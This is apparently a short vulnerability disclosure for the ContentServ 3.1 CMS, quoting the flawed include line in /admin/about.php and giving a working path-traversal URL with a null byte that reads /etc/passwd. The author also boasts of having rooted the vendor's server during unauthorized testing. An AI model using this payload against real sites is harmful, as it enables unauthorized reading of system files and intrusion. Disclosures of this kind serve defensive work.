ContentServ is a cms developed by ... ContentServ.de and is a quite
commonly used cms system at least in .de.

Some months ago while pentesting www.contentserv.com i've found a bug
(yo alex i rooted you back then but somehow you didn't need sec support)
in ContentServ 3.1. which - to my surprise - is still accessible on some
installations. Somebody should have read the apache logs over there ;)
I had some fun with it (the bug and your server) back then.

The bug resides in /admin/about.php:
[...]
        include("../$ctsWebsite/data/config.php");
[...]


This boils down to a damn stupid:

www.we-cant-design-our-hp.com/contentserv/3.1/admin/about.php?
ctsWebsite=../../../../../../../../../../etc/passwd%00

to give you some informations.
